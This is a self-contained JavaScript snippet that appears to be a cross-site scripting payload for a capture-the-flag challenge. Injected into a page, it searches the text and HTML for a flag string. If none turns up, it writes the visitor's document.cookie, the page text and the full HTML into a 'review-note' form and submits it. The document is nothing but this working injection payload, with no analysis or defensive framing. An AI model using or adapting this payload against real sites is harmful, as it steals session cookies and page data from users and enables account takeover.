(() => {
  const form = document.getElementById('review-note');
  if (!form) return;
  const text = document.body ? document.body.innerText : '';
  const html = document.documentElement.innerHTML;
  const match = `${text}\n${html}`.match(/(?:firebird|flag|ctf)\{[^}]+\}/i);
  form.elements.namedItem('note').value = (match ? match[0] : [document.cookie, text, html].join('\n')).slice(0, 6000);
  form.submit();
})();
